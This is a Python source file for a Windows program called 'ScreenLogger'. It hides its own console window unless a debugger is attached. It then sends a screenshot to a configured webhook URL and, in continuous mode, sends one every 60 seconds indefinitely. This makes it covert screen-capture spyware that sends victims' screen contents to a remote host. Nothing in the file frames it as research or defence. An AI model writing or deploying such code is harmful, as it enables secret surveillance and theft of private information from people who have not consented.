import win32gui
import win32con
import win32api
import time
import sys
import os
from webhook import send_screenshot
from config import WEBHOOK_URL, CAPTURE_MODE

def hide_window():
    """Hide the console window"""
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

import logging

def setup_logging():
    """Configure logging to file"""
    logging.basicConfig(
        filename='screenlogger.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def run():
    """Main background execution loop"""
    setup_logging()
    logging.info("ScreenLogger started")
    
    # Hide window if not running in debug mode
    if not hasattr(sys, 'gettrace') or not sys.gettrace():
        hide_window()
    
    try:
        # Send initial screenshot
        logging.info("Sending initial screenshot")
        success = send_screenshot(WEBHOOK_URL)
        if not success:
            logging.error("Failed to send initial screenshot")
        
        # Only continue if in continuous mode
        if CAPTURE_MODE == "continuous":
            logging.info("Running in continuous mode")
            while True:
                time.sleep(60)  # Wait 60 seconds
                logging.info("Sending periodic screenshot")
                success = send_screenshot(WEBHOOK_URL)
                if not success:
                    logging.error("Failed to send periodic screenshot")
        else:
            logging.info("Single capture mode completed")
            
    except KeyboardInterrupt:
        logging.info("Received keyboard interrupt, exiting")
    except Exception as e:
        logging.exception("Unexpected error occurred")
    finally:
        logging.info("ScreenLogger exiting")

if __name__ == "__main__":
    run()
